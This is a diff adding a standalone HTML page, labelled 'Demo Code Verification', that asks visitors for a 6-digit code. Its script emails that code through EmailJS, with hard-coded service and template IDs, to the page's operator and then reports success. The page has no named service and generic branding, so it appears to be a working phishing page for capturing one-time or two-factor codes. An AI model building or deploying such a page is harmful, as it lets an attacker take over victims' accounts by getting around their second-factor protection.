@@ -1,0 +1,307 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo Code Verification</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    min-height: 100vh;
+    font-family: 'Inter', sans-serif;
+    background: #080d19;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 390px;
+    background: #111a2c;
+    border: 1px solid #26344c;
+    border-radius: 22px;
+    padding: 30px 25px;
+    box-shadow: 0 20px 70px rgba(0,0,0,.4);
+    animation: appear .6s ease;
+}
+
+@keyframes appear {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.logo {
+    width: 55px;
+    height: 55px;
+    border-radius: 16px;
+    background: linear-gradient(135deg,#5578ff,#8754e8);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 25px;
+    margin: 0 auto 22px;
+    box-shadow: 0 8px 25px #5578ff40;
+}
+
+h2 {
+    text-align: center;
+    font-size: 23px;
+    font-weight: 800;
+    margin-bottom: 9px;
+}
+
+.subtitle {
+    text-align: center;
+    color: #98a6bd;
+    font-size: 12px;
+    line-height: 1.7;
+    margin-bottom: 27px;
+}
+
+.label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    margin-bottom: 10px;
+    color: #dbe4f5;
+}
+
+input {
+    width: 100%;
+    height: 57px;
+    background: #0a1221;
+    border: 1px solid #34435e;
+    border-radius: 12px;
+    outline: none;
+    color: white;
+    font-size: 23px;
+    font-weight: 700;
+    letter-spacing: 12px;
+    text-align: center;
+    transition: .3s;
+}
+
+input:focus {
+    border-color: #708bff;
+    box-shadow: 0 0 0 3px #708bff20;
+}
+
+input::placeholder {
+    color: #45536a;
+    letter-spacing: 9px;
+}
+
+.info {
+    margin-top: 12px;
+    color: #8492a9;
+    font-size: 10px;
+    text-align: center;
+}
+
+button {
+    margin-top: 23px;
+    width: 100%;
+    height: 49px;
+    border: none;
+    border-radius: 11px;
+    background: linear-gradient(110deg,#5278ff,#8155e9);
+    color: white;
+    font-size: 13px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: .3s;
+}
+
+button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px #6279ff40;
+}
+
+button:disabled {
+    opacity: .6;
+    cursor: not-allowed;
+    transform: none;
+}
+
+#message {
+    display: none;
+    margin-top: 17px;
+    padding: 12px;
+    border-radius: 9px;
+    text-align: center;
+    font-size: 11px;
+    line-height: 1.6;
+}
+
+.success {
+    display: block !important;
+    color: #65e6a1;
+    background: #123626;
+}
+
+.error {
+    display: block !important;
+    color: #ff8d8d;
+    background: #391c27;
+}
+
+.footer {
+    text-align: center;
+    color: #62718a;
+    font-size: 10px;
+    margin-top: 26px;
+}
+
+.security {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    margin-top: 20px;
+    color: #8395b1;
+    font-size: 10px;
+}
+
+@media(max-width:400px) {
+    .container {
+        padding: 27px 20px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">✦</div>
+
+    <h2> Verification</h2>
+
+    <p class="subtitle">
+        Enter your 6-digit code below to submit your verification request.
+    </p>
+
+    <form id="verificationForm">
+
+        <label class="label" for="demoCode">
+            ENTER 6-DIGIT  CODE
+        </label>
+
+        <input
+            type="text"
+            id="demoCode"
+            name="demo_code"
+            placeholder="000000"
+            maxlength="6"
+            inputmode="numeric"
+            autocomplete="off"
+            required
+        >
+
+        <p class="info">Please enter exactly 6 numeric digits.</p>
+
+        <button type="submit" id="submitBtn">
+            Submit  Code →
+        </button>
+
+    </form>
+
+    <div id="message"></div>
+
+    <div class="security">
+        🔒 Secure Demo Submission
+    </div>
+
+    <div class="footer">
+        © 2026 Verification. All rights reserved.
+    </div>
+
+</div>
+
+<script>
+
+// Initialize EmailJS
+emailjs.init({
+    publicKey: "6erjYuJfp4rK9fAC6"
+});
+
+const form = document.getElementById("verificationForm");
+const codeInput = document.getElementById("demoCode");
+const submitBtn = document.getElementById("submitBtn");
+const message = document.getElementById("message");
+
+// Allow numbers only
+codeInput.addEventListener("input", function() {
+    this.value = this.value.replace(/\D/g, "").slice(0, 6);
+});
+
+form.addEventListener("submit", async function(e) {
+
+    e.preventDefault();
+
+    const demoCode = codeInput.value.trim();
+
+    message.className = "";
+    message.style.display = "none";
+
+    if (!/^\d{6}$/.test(demoCode)) {
+        message.textContent = "Please enter a valid 6-digit demo code.";
+        message.className = "error";
+        return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Submitting...";
+
+    try {
+
+        await emailjs.send(
+            "service_ftvqdei",
+            "template_04bxu5b",
+            {
+                demo_code: demoCode
+            }
+        );
+
+        message.textContent = "✓  code success!";
+        message.className = "success";
+
+        form.reset();
+
+    } catch(error) {
+
+        console.error("EmailJS Error:", error);
+
+        message.textContent =
+            "Submission failed. Please check your connection and try again.";
+
+        message.className = "error";
+
+    } finally {
+
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Submit Demo Code →";
+
+    }
+
+});
+
+</script>
+
+</body>
+</html>
